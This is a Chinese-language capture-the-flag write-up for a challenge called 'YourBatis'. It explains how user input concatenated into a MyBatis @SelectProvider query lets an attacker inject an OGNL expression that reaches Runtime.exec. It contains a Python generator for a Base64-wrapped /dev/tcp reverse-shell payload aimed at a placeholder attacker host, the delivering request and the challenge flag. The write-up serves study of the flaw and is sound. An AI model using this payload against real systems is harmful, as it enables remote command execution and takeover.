# YourBatis

## 题目简述

应用使用 `mybatis-spring-boot-starter 2.1.1`，其中实际打包的 MyBatis Core 为 `3.5.3`。`/user` 接口把用户可控的 `username` 直接拼进 `@SelectProvider` 返回的 SQL 字符串，导致攻击者不仅能注入 SQL，还能注入会被 MyBatis 再次解析的 `${...}` OGNL 表达式。

## 解题过程

### 确认 Provider 注入点

反编译 `UserMapper` 可见，`getUserByUsername` 使用 `UserSqlProvider.buildGetUserByUsername` 生成查询。关键实现为：

```java
public String buildGetUserByUsername(final String username) {
    return new SQL() {{
        SELECT("*");
        FROM("users");
        WHERE(String.format("username = '%s'", username));
    }}.toString();
}
```

正常输入 `admin` 会形成：

```sql
SELECT * FROM users WHERE (username = 'admin')
```

由于 Provider 的返回值会作为动态 SQL 继续解析，若 `username` 中含 `${expression}`，MyBatis 会用 OGNL 求值并把结果替换回 SQL。OGNL 支持通过 `@类名@静态方法` 调用 Java 方法，因此可触发 `Runtime.exec`。

### 避免大括号破坏表达式

下面这种直接写法在简单命令上可用：

```text
${@java.lang.Runtime@getRuntime().exec("id")}
```

但常见的 Bash 管道命令包含 `{echo,...}`。其中的 `}` 会提前结束 MyBatis 的 `${...}` 占位符，使表达式截断。解决方法是先把整条运行时命令 Base64 编码，OGNL 内只保留不含大括号的编码文本，再调用 Java 自带的 Base64 解码器。

以下脚本使用占位地址生成最终 URL 编码参数：

```python
import base64
from urllib.parse import quote

host = "<ATTACKER_HOST>"
port = "<ATTACKER_PORT>"

shell = f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
shell_b64 = base64.b64encode(shell.encode()).decode()

# 除 bash 与 -c 之间外，第三个参数中不留空格，适配 Runtime.exec(String) 的分词。
runtime_command = (
    f"bash -c {{echo,{shell_b64}}}|{{base64,-d}}|{{bash,-i}}"
)
runtime_b64 = base64.b64encode(runtime_command.encode()).decode()

ognl = (
    "${@java.lang.Runtime@getRuntime().exec("
    "new java.lang.String(@java.util.Base64@getDecoder().decode('"
    + runtime_b64
    + "')))}"
)
print(quote(ognl, safe=""))
```

将输出作为 `username` 发送到：

```text
GET /user?username=<URL_ENCODED_OGNL>
```

接口可能返回 HTTP `500`：OGNL 已在动态 SQL 构造阶段执行，但表达式返回的 `Process` 对象文本会继续进入 SQL，后续查询失败并不代表命令没有运行。应以回连或其他可观测副作用判断是否触发成功。

在题目授权环境中接收连接后读取环境变量 `flag`：

```sh
printenv flag
```

得到：

```text
0xGame{18cb86b1-2272-4da0-b2e7-89f0771d329b}
```

## 方法总结

漏洞根因是把不可信字符串拼入 Provider 生成的动态 SQL；该字符串随后还会经过 MyBatis 的 `${...}`/OGNL 解析，因此影响从 SQL 注入升级为 Java 方法调用。利用时要同时处理两层语法：用 Java Base64 解码避免命令中的大括号截断 OGNL，再对完整表达式做 URL 编码，防止 HTTP 查询参数解析改变特殊字符。
